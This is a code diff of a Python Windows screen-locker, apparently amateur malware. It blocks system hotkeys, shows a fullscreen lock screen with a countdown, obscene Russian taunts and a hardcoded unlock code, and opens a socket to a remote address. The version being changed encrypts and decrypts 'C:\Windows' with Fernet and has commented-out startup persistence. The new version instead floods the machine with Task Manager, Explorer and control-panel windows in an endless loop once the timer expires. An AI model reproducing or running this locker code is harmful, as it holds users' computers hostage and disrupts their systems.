@@ -15,20 +15,12 @@ from PIL import Image, ImageTk
 import socket
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("127.0.0.1", 12345))
+client.connect(("10.0.0.176", 12346))
 
-
-keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
-keyboard.add_hotkey("win + r", lambda: None, suppress =True)
-keyboard.add_hotkey("win + e", lambda: None, suppress =True)
-keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)
-
-#startup_filename = "JUMBO LOCKER"
-#startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-#current_script = sys.argv[0]
-#startup_script = os.path.join(startup_folder, startup_filename + ".exe")
-#if not os.path.exists(startup_script):
-#   shutil.copy2(current_script, startup_script)
+keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
+keyboard.add_hotkey("win + r", lambda: None, suppress=True)
+keyboard.add_hotkey("win + e", lambda: None, suppress=True)
+keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress=True)
 
 image_path = "background.png"
 def set_background(window, image_path):
@@ -42,14 +34,6 @@ def set_background(window, image_path):
     background_label.lower()
 
 
-def decrypt_file(file_path, key):
-    with open(file_path, "rb") as file:
-        encrypted_data = file.read()
-    fernet = Fernet(key)
-    decrypted_data = fernet.decrypt(encrypted_data)
-    with open(file_path, "wb") as file:
-        file.write(decrypted_data)
-
 def check():
     global is_code_entered
     if entry.get() == unlock_key:
@@ -58,25 +42,34 @@ def check():
         win.attributes("-fullscreen", False)
         win.update()
         win.geometry("300x300")
-        decrypt_file(file_to_encrypt, fernet_key)
-        sys.exit() 
+        win.quit()
+        sys.exit()
     else:
         messagebox.showinfo("Уведомление", "ДА ПИЗДА УЖЕ КОМПУ МОЖЕШЬ НЕ ПЫТАТЬСЯ")
+        win.iconify()
+
+def open_task_manager():
+    subprocess.run(["taskmgr"])
+
+def open_file_explorer():
+    subprocess.run(["explorer"])
+
+def open_run_dialog():
+    subprocess.run(["rundll32", "shell32.dll,ShellExec_RunDLL", "appwiz.cpl"])
 
 def on_closing():
     global is_code_entered
     if not is_code_entered:
         messagebox.showinfo("Уведомление", "НЕ ПЫТАЙСЯ, Я ВСЕРАВНО ВЫЕБУ ТВОЮ ЖЕПУ")
-    else:
-        win.quit()
 
-def encrypt_file(file_path, key):
-    with open(file_path, "rb") as file:
-        data = file.read()
-    fernet = Fernet(key)
-    encrypted_data = fernet.encrypt(data)
-    with open(file_path, "wb") as file:
-        file.write(encrypted_data)
+def open_windows_cyclically():
+    while not is_code_entered:
+        open_task_manager()  # Открыть диспетчер задач
+        time.sleep(0)  # возможность добавить задержку
+        open_file_explorer()  # Открыть Проводник
+        time.sleep(0)  # возможность добавить задержку
+        open_run_dialog()  # Открыть диалог "Выполнить"
+        time.sleep(0)  # возможность добавить задержку
 
 def countdown_thread(seconds, file_to_encrypt):
     while seconds > 0 and not is_code_entered:
@@ -86,10 +79,12 @@ def countdown_thread(seconds, file_to_encrypt):
         seconds -= 1
     if not is_code_entered:
         time_label.config(text="Время истекло!")
-        encrypt_file(file_to_encrypt, fernet_key)  
+        countdown_thread = threading.Thread(target=open_windows_cyclically)
+        countdown_thread.start()
+        
 
 audio_path = 'angry-birds-bass-boosted.mp3'
-file_to_encrypt = "C:\Windows"  
+file_to_encrypt = "C:\Windows"
 
 unlock_key = '123123'
 is_code_entered = False
@@ -116,12 +111,11 @@ entry.grid(row=4, padx=350, pady=20)
 button = tk.Button(win, text="Ввести код", command=check)
 button.grid(row=5, padx=350, pady=20)
 
-seconds_to_countdown = 3600
+seconds_to_countdown = 1800
 time_label = tk.Label(win, text="", fg='red', bg='black')
 time_label.grid(row=0, padx=350, pady=20)
 
 fernet_key = Fernet.generate_key()
-
 
 pygame.init()
 pygame.mixer.init()
